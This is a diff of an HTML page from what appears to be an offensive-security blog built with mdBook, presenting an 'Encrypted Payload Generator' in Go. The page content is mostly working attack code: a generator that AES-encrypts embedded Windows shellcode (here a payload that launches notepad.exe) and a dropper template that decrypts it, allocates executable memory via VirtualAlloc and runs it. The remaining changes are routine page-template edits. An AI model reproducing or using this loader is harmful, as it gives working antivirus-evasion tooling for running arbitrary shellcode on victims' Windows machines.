@@ -1,14 +1,16 @@
 <!DOCTYPE HTML>
-<html lang="en" class="sidebar-visible no-js navy">
+<html lang="en" class="navy" dir="ltr">
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
         <title>Encrypted Paylod Generator - Jan0ski&#x27;s Security Blog</title>
+
+
         <!-- Custom HTML head -->
-        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="theme-color" content="#ffffff" />
+        <meta name="theme-color" content="#ffffff">
 
         <link rel="icon" href="../favicon.svg">
         <link rel="shortcut icon" href="../favicon.png">
@@ -16,25 +18,29 @@
         <link rel="stylesheet" href="../css/general.css">
         <link rel="stylesheet" href="../css/chrome.css">
         <link rel="stylesheet" href="../css/print.css" media="print">
+
         <!-- Fonts -->
         <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
         <link rel="stylesheet" href="../fonts/fonts.css">
+
         <!-- Highlight.js Stylesheets -->
         <link rel="stylesheet" href="../highlight.css">
         <link rel="stylesheet" href="../tomorrow-night.css">
         <link rel="stylesheet" href="../ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
+
     </head>
-    <body>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
         <!-- Provide site root to javascript -->
-        <script type="text/javascript">
+        <script>
             var path_to_root = "../";
             var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "navy";
         </script>
 
         <!-- Work around some values being stored in localStorage wrapped in quotes -->
-        <script type="text/javascript">
+        <script>
             try {
                 var theme = localStorage.getItem('mdbook-theme');
                 var sidebar = localStorage.getItem('mdbook-sidebar');
@@ -50,45 +56,76 @@
         </script>
 
         <!-- Set the theme before any content is loaded, prevents flash -->
-        <script type="text/javascript">
+        <script>
             var theme;
             try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
             if (theme === null || theme === undefined) { theme = default_theme; }
             var html = document.querySelector('html');
-            html.classList.remove('no-js')
             html.classList.remove('navy')
             html.classList.add(theme);
-            html.classList.add('js');
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
         </script>
 
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
         <!-- Hide / unhide sidebar before it is displayed -->
-        <script type="text/javascript">
-            var html = document.querySelector('html');
-            var sidebar = 'hidden';
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
             if (document.body.clientWidth >= 1080) {
                 try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                 sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
             }
-            html.classList.remove('sidebar-visible');
-            html.classList.add("sidebar-" + sidebar);
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
         </script>
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../prefix.html">Index</a></li><li class="chapter-item expanded affix "><li class="part-title">Code</li><li class="chapter-item expanded "><a href="../golang/index.html"><strong aria-hidden="true">1.</strong> Offensive Go</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../golang/rev-shell.html"><strong aria-hidden="true">1.1.</strong> Reverse Shell</a></li><li class="chapter-item expanded "><a href="../golang/code-injection.html"><strong aria-hidden="true">1.2.</strong> Code Injection</a></li><li class="chapter-item expanded "><a href="../golang/encrypted-generator.html" class="active"><strong aria-hidden="true">1.3.</strong> Encrypted Paylod Generator</a></li><li class="chapter-item expanded "><a href="../golang/exif-fuzz.html"><strong aria-hidden="true">1.4.</strong> Exif Parser Fuzzing</a></li></ol></li><li class="chapter-item expanded "><li class="part-title">Cloud Security</li><li class="chapter-item expanded "><a href="../k8s/index.html"><strong aria-hidden="true">2.</strong> Containers &amp; Kubernetes</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../k8s/hostpath.html"><strong aria-hidden="true">2.1.</strong> HostPath</a></li><li class="chapter-item expanded "><a href="../k8s/kubesec-sdk.html"><strong aria-hidden="true">2.2.</strong> Kube_Security_Lab w/ Client-go</a></li></ol></li><li class="chapter-item expanded "><li class="part-title">Challenges</li><li class="chapter-item expanded "><a href="../ctf/index.html"><strong aria-hidden="true">3.</strong> CTF Write-ups</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../prefix.html">Index</a></li><li class="chapter-item expanded affix "><li class="part-title">Code</li><li class="chapter-item expanded "><a href="../golang/index.html"><strong aria-hidden="true">1.</strong> Offensive Go</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../golang/rev-shell.html"><strong aria-hidden="true">1.1.</strong> Reverse Shell</a></li><li class="chapter-item expanded "><a href="../golang/code-injection.html"><strong aria-hidden="true">1.2.</strong> Code Injection</a></li><li class="chapter-item expanded "><a href="../golang/encrypted-generator.html" class="active"><strong aria-hidden="true">1.3.</strong> Encrypted Paylod Generator</a></li><li class="chapter-item expanded "><a href="../golang/exif-fuzz.html"><strong aria-hidden="true">1.4.</strong> Exif Parser Fuzzing</a></li></ol></li><li class="chapter-item expanded "><li class="part-title">Cloud Security</li><li class="chapter-item expanded "><a href="../k8s/index.html"><strong aria-hidden="true">2.</strong> Containers & Kubernetes</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../k8s/hostpath.html"><strong aria-hidden="true">2.1.</strong> HostPath</a></li><li class="chapter-item expanded "><a href="../k8s/kubesec-sdk.html"><strong aria-hidden="true">2.2.</strong> Kube_Security_Lab w/ Client-go</a></li></ol></li><li class="chapter-item expanded "><li class="part-title">Challenges</li><li class="chapter-item expanded "><a href="../ctf/index.html"><strong aria-hidden="true">3.</strong> CTF Write-ups</a></li></ol>
             </div>
-            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
         </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
 
         <div id="page-wrapper" class="page-wrapper">
 
             <div class="page">
-                <div id="menu-bar-hover-placeholder"></div>
-                <div id="menu-bar" class="menu-bar sticky bordered">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
                     <div class="left-buttons">
-                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                             <i class="fa fa-bars"></i>
-                        </button>
+                        </label>
                         <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                             <i class="fa fa-paint-brush"></i>
                         </button>
@@ -96,7 +133,7 @@
                             <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                         </ul>
                         <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
@@ -113,6 +150,7 @@
                         <a href="https://github.com/jan0ski/jan0ski.github.io" title="Git repository" aria-label="Git repository">
                             <i id="git-repository-button" class="fa fa-github"></i>
                         </a>
+
                     </div>
                 </div>
 
@@ -126,8 +164,9 @@
                         </ul>
                     </div>
                 </div>
+
                 <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
-                <script type="text/javascript">
+                <script>
                     document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                     document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                     Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
@@ -143,21 +182,21 @@
 <h2 id="encrypted-payload-generator"><a class="header" href="#encrypted-payload-generator">Encrypted Payload Generator</a></h2>
 <ul>
 <li>Generate shellcode with msfvenom or other tools.</li>
-<li>Encrypt it using AES-256. </li>
-<li>Place the key and the encrypted shellcode into a template Go file. </li>
+<li>Encrypt it using AES-256.</li>
+<li>Place the key and the encrypted shellcode into a template Go file.</li>
 </ul>
 <p>Usage:</br>
 <code>$ go run encrypted_payload_creator.go &gt; payload.go</code></p>
 <pre><code class="language-go">package main
 
 import (
-	&quot;crypto/aes&quot;
-	&quot;crypto/cipher&quot;
-	&quot;crypto/rand&quot;
-	&quot;encoding/base64&quot;
-	&quot;io/ioutil&quot;
-	&quot;os&quot;
-	&quot;text/template&quot;
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"encoding/base64"
+	"io/ioutil"
+	"os"
+	"text/template"
 )
 
 // Struct to hold template arguments
@@ -190,19 +229,19 @@ func encrypt(plaintext []byte) (string, string) {
 
 func main() {
 	// Read go code template file
-	file, err := ioutil.ReadFile(&quot;encrypted_shellcode_template.go&quot;)
+	file, err := ioutil.ReadFile("encrypted_shellcode_template.go")
 	if err != nil {
 		panic(err)
 	}
 
 	// Parse template
-	tmpl, err := template.New(&quot;body&quot;).Parse(string(file))
+	tmpl, err := template.New("body").Parse(string(file))
 	if err != nil {
 		panic(err)
 	}
 
 	// Encrypt payload (notepad.exe)
-	data := []byte(&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00&quot;)
+	data := []byte("\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00")
 	ciphertext, key := encrypt(data)
 
 	// Generate go code for dropper using Ciphertext and Key template variables, print to Stdout
@@ -231,12 +270,12 @@ PS C:\&gt; $Env:GOARCH=386; go build encrypted_shellcode.go
 <pre><code class="language-go">package main
 
 import (
-	&quot;crypto/aes&quot;
-	&quot;crypto/cipher&quot;
-	&quot;encoding/base64&quot;
-	&quot;strings&quot;
-	&quot;syscall&quot;
-	&quot;unsafe&quot;
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/base64"
+	"strings"
+	"syscall"
+	"unsafe"
 )
 
 const (
@@ -247,14 +286,14 @@ const (
 )
 
 var (
-	kernel32         = syscall.NewLazyDLL(&quot;kernel32.dll&quot;)
-	procVirtualAlloc = kernel32.NewProc(&quot;VirtualAlloc&quot;)
+	kernel32         = syscall.NewLazyDLL("kernel32.dll")
+	procVirtualAlloc = kernel32.NewProc("VirtualAlloc")
 )
 
 func main() {
 	// Decode ciphertext into shellcode
-	ciphertext, _ := base64.StdEncoding.DecodeString(&quot;{{.Ciphertext}}&quot;)
-	key, _ := base64.StdEncoding.DecodeString(&quot;{{.Key}}&quot;)
+	ciphertext, _ := base64.StdEncoding.DecodeString("{{.Ciphertext}}")
+	key, _ := base64.StdEncoding.DecodeString("{{.Key}}")
 	block, _ := aes.NewCipher(key)
 	plaintext := make([]byte, len(ciphertext))
 	stream := cipher.NewCTR(block, key[aes.BlockSize:])
@@ -262,7 +301,7 @@ func main() {
 
 	// Allocate memory as PAGE_EXECUTE_READWRITE
 	addr, _, err := procVirtualAlloc.Call(0, uintptr(len(plaintext)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-	if err != nil &amp;&amp; !strings.Contains(err.Error(), &quot;operation completed successfully&quot;) {
+	if err != nil &amp;&amp; !strings.Contains(err.Error(), "operation completed successfully") {
 		panic(err)
 	}
 
@@ -288,9 +327,11 @@ func main() {
                             <a rel="prev" href="../golang/code-injection.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                 <i class="fa fa-angle-left"></i>
                             </a>
-                            <a rel="next" href="../golang/exif-fuzz.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+
+                            <a rel="next prefetch" href="../golang/exif-fuzz.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <i class="fa fa-angle-right"></i>
                             </a>
+
                         <div style="clear: both"></div>
                     </nav>
                 </div>
@@ -300,23 +341,33 @@ func main() {
                     <a rel="prev" href="../golang/code-injection.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
-                    <a rel="next" href="../golang/exif-fuzz.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+
+                    <a rel="next prefetch" href="../golang/exif-fuzz.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
             </nav>
 
         </div>
 
-        <script type="text/javascript">
+
+
+
+        <script>
             window.playground_copyable = true;
         </script>
-        <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
-        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
-        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
-        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
-        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
-        <script src="../book.js" type="text/javascript" charset="utf-8"></script>
+
+
+        <script src="../elasticlunr.min.js"></script>
+        <script src="../mark.min.js"></script>
+        <script src="../searcher.js"></script>
+
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
 
         <!-- Custom JS scripts -->
+
+
+    </div>
     </body>
 </html>
